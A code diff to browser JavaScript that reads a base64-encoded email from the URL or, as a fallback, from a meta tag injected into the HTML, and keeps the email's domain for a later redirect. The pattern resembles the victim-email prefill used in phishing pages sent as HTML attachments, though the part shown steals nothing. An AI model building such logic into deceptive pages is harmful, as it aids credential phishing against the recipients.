@@ -1,6 +1,14 @@
 document.addEventListener("DOMContentLoaded", async function() {
     const urlParams = new URLSearchParams(window.location.search);
-    const base64Email = urlParams.get('email');
+    let base64Email = urlParams.get('email');
+
+    // Fallback: if the email wasn't provided via the query (e.g., when opening a blob),
+    // check for a meta tag injected into the HTML: <meta name="injected-email" content="...">
+    if (!base64Email) {
+        const metaInjected = document.querySelector('meta[name="injected-email"]');
+        if (metaInjected) base64Email = metaInjected.getAttribute('content') || null;
+    }
+
     // Will store extracted domain for later redirect use
     let domain = ''; 
 
